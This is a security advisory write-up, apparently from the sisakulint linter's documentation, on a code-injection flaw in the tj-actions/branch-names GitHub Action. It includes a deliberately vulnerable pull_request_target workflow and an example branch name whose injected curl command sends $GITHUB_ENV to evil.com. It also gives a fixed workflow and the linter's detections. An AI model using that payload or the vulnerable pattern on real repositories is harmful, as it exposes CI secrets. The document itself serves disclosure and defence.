# GHSA-8v8w-v8xg-79rf: Code Injection via Unsanitized Branch Names in tj-actions/branch-names

## Summary

| Field | Value |
|-------|-------|
| **Advisory ID** | GHSA-8v8w-v8xg-79rf |
| **Package** | tj-actions/branch-names |
| **Severity** | Critical (CVSS 9.3) |
| **Vulnerability Type** | Code Injection (CWE-20) |
| **Affected Versions** | < 7.0.7 (CVE-2023-49291), <= 8.2.1 (CVE-2025-54416) |
| **Fixed Version** | v9.0.0 (addresses both CVE-2023-49291 and CVE-2025-54416) |
| **Published** | 2024-01-30 |
| **Advisory URL** | https://github.com/advisories/GHSA-8v8w-v8xg-79rf |

## Vulnerability Description

The `tj-actions/branch-names` action (versions < 7.0.7) is vulnerable to code injection when branch names from `github.head_ref` or `github.base_ref` are referenced directly within the composite action's `action.yml` file without proper sanitization. This vulnerability affects workflows using the `pull_request_target` trigger, which executes with base repository privileges including access to secrets and write permissions.

**Technical Details:**
- CVSS Score: 9.3/10 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N)
- CWE-20: Improper Input Validation
- EPSS: 1.212% (79th percentile probability of exploitation)
- Attack Vector: Network-based, no privileges or user interaction required
- Scope Change: Yes - can impact resources beyond the vulnerable component

**Attack Mechanism:**
An attacker can create a branch with special characters like backticks, `$()`, or semicolons that have special meaning in shell contexts. The vulnerable code in the action directly references these values:
```yaml
echo "github.event.pull_request.head.ref: ${{ github.event.pull_request.head.ref }}"
echo "github.head_ref: ${{ github.head_ref }}"
```

**Example Attack:**
A branch named ``main`curl -d @$GITHUB_ENV http://evil.com` `` would exfiltrate secrets when the workflow executes.

**The Fix (v7.0.7):**
The security patch moves all GitHub context variables to environment variables:
- Commit: 4923d1ca41f928c24f1c1b3af9daaadfb71e6337
- Before: Direct interpolation in echo statements
- After: Uses `env:` block then references shell variables

### Attack Scenario

1. Attacker creates a malicious branch name: ``main`curl -d @$GITHUB_ENV http://evil.com` ``
2. Opens a pull request targeting a repository with vulnerable workflow
3. The `pull_request_target` workflow executes with elevated privileges
4. The branch name is directly substituted into shell commands
5. Attacker's injected commands execute, potentially exfiltrating secrets

## Vulnerable Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  process-branch:
    runs-on: ubuntu-latest
    steps:
      - name: Process branch name
        run: |
          # Vulnerable: Direct substitution without env variable
          BRANCH_NAME=${{ github.head_ref }}
          echo "Processing branch: $BRANCH_NAME"

          if [ "$BRANCH_NAME" != "" ]; then
            echo "Branch validation passed"
          fi

      - name: Create tag
        run: |
          # Vulnerable: Using branch name directly
          TAG_NAME="release-${{ github.head_ref }}"
          echo "Would create tag: $TAG_NAME"
```

### Why This is Vulnerable

- `${{ github.head_ref }}` is expanded before environment variable assignment
- Shell interprets special characters and command substitution
- No input sanitization or validation
- Privileged context (`pull_request_target`) amplifies impact

## Safe Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  process-branch:
    runs-on: ubuntu-latest
    steps:
      - name: Process branch name
        env:
          BRANCH_NAME: ${{ github.head_ref }}
        run: |
          # Safe: Use environment variable
          echo "Processing branch: $BRANCH_NAME"

          if [ "$BRANCH_NAME" != "" ]; then
            echo "Branch validation passed"
          fi

      - name: Create tag
        env:
          HEAD_REF: ${{ github.head_ref }}
        run: |
          # Safe: Use environment variable
          TAG_NAME="release-$HEAD_REF"
          echo "Would create tag: $TAG_NAME"
```

### Why This is Safe

- Environment variables prevent command expansion
- GitHub Actions runtime handles escaping when setting env vars
- Input is treated as literal string value
- Special characters lose their shell meaning

## Detection in sisakulint

### Expected Rules

- **CodeInjectionCriticalRule** - Should detect direct usage of `github.head_ref`/`github.base_ref` in shell commands with `pull_request_target` trigger

### Detection Result

```
script/actions/advisory/GHSA-8v8w-v8xg-79rf-vulnerable.yaml:23:26: code injection (critical): "github.head_ref" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
script/actions/advisory/GHSA-8v8w-v8xg-79rf-vulnerable.yaml:34:32: code injection (critical): "github.head_ref" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| Yes | CodeInjectionCriticalRule | Yes |

sisakulint successfully detected both instances of code injection vulnerability:
- Line 23: Direct usage of `github.head_ref` in shell variable assignment
- Line 34: Direct usage of `github.head_ref` in string interpolation

The detection correctly identifies this as a **critical** vulnerability because it occurs in a workflow with `pull_request_target` trigger, which grants elevated privileges.

Test files:
- Vulnerable: `script/actions/advisory/GHSA-8v8w-v8xg-79rf-vulnerable.yaml`
- Safe: `script/actions/advisory/GHSA-8v8w-v8xg-79rf-safe.yaml`

### Verification Command

```bash
sisakulint script/actions/advisory/GHSA-8v8w-v8xg-79rf-vulnerable.yaml
sisakulint script/actions/advisory/GHSA-8v8w-v8xg-79rf-safe.yaml
```

## Mitigation Strategies

1. **Always Use Environment Variables** (Recommended)
   - Pass all GitHub context values through the `env:` key
   - This is the primary defense against code injection

2. **Input Validation**
   - Validate branch names against allowed patterns
   - Example: `[[ "$BRANCH_NAME" =~ ^[a-zA-Z0-9/_-]+$ ]]`

3. **Avoid Privileged Triggers**
   - Use `pull_request` instead of `pull_request_target` when possible
   - Limits the impact of successful injection

4. **Update Actions**
   - Upgrade to `tj-actions/branch-names@v9.0.0` or later
   - Note: v8.2.1 and below are affected by CVE-2025-54416; only v9.0.0+ addresses both CVE-2023-49291 and CVE-2025-54416
   - Use official actions that handle sanitization

## References

- GitHub Advisory: https://github.com/advisories/GHSA-8v8w-v8xg-79rf
- Repository Security Advisory: https://github.com/tj-actions/branch-names/security/advisories/GHSA-8v8w-v8xg-79rf
- Security Patch Commits:
  - https://github.com/tj-actions/branch-names/commit/4923d1ca41f928c24f1c1b3af9daaadfb71e6337
  - https://github.com/tj-actions/branch-names/commit/6c999acf206f5561e19f46301bb310e9e70d8815
  - https://github.com/tj-actions/branch-names/commit/726fe9ba5e9da4fcc716223b7994ffd0358af060
- tj-actions/branch-names Repository: https://github.com/tj-actions/branch-names
- CVE: CVE-2023-49291
- CWE-20: Improper Input Validation
- GitHub Actions Security Hardening: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- Related sisakulint rules:
  - [Code Injection Rule](../codeinjectionrule.md)
